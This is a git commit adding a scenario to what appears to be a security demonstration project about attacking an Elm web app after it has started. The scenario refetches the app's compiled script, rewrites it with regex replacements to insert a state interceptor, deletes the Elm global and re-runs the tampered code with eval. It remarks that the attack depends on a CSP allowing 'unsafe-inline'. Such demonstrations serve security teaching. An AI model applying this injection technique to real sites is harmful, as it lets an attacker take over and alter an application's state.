8fbcb6f57c03932afe58ce64a84137306f0c8420
Martin Feineis <mfeineis@users.noreply.github.com>
2019-08-17 14:07:36 +0200

    feat(after-app-init): Add "manipulate-source-and-run-evil-app" scenario

--- js/body-compromised-after-app-init.js
+++ js/body-compromised-after-app-init.js
@@ -146,4 +146,68 @@
 
     });
 
+    scenario("Manipulating the source code and re-initializing a new app instance", function (log, remarks, globalEval) {
+        remarks(
+            "This attack only works with CSP script-src 'unsafe-inline'."
+        );
+
+        log("Looking for the script of the Elm app...");
+        const script = document.querySelector("[src*='dist\/app']");
+
+        log("Setting up interceptor function for the app model...");
+        window.__interceptModel = function (model) {
+            log("Intercepted Elm model " + JSON.stringify(model, null, 2));
+            model.isCompromised = true;
+            model.I = true;
+            console.log("Compromised model", model);
+            return model;
+        };
+
+        log("Pulling the source via XHR...");
+        httpGet(script.src, function (err, code) {
+            if (err) {
+                throw err;
+            }
+
+            function tweak(src) {
+                return src.replace(/Elm App/, "Evil Elm App")
+                    //.replace(/_Platform_dispatchEffects\(managers, result\.b, subscriptions\(model\)\);/g, "_Platform_dispatchEffects(managers, result.b, subscriptions(window.__interceptModel(model)));")
+                    .replace(/var model = result.a;/g, "var model = window.__interceptModel(result.a);")
+                    .replace("c=(f=e(f.a)).a", "c=window.__interceptModel((f=e(f.a)).a)");
+            }
+
+            log("Got the code, manipulating the source...");
+            const manipulated = tweak(code);
+            // console.log("manipulated", { manipulated: manipulated });
+
+            log("Deleting the 'Elm' global");
+            window.OriginalElm = window.Elm;
+            delete window.Elm;
+
+            log("Using 'eval' to set up our evil runtime");
+            globalEval(manipulated);
+
+            log("Looking for an init script... (not necessary when the init is bundled with the app)");
+            const initScript = document.querySelector("[src*='js\/main']");
+
+            log("Pulling the init script via XHR...");
+            httpGet(initScript.src, function (err, initCode) {
+                let rootId = null;
+                initCode.replace(/querySelector\s*\((?:'|")#([^'"]+)/, function (_, id) {
+                    rootId = id;
+                });
+
+                log("Setting up the DOM for our evil app...");
+                const evilApp = document.createElement("div");
+                evilApp.id = rootId;
+                document.body.insertBefore(evilApp, document.querySelector("#abstract").nextSibling);
+
+                log("Initializing our evil app via 'eval'...");
+                globalEval(initCode);
+
+            });
+        });
+
+    });
+
 }));
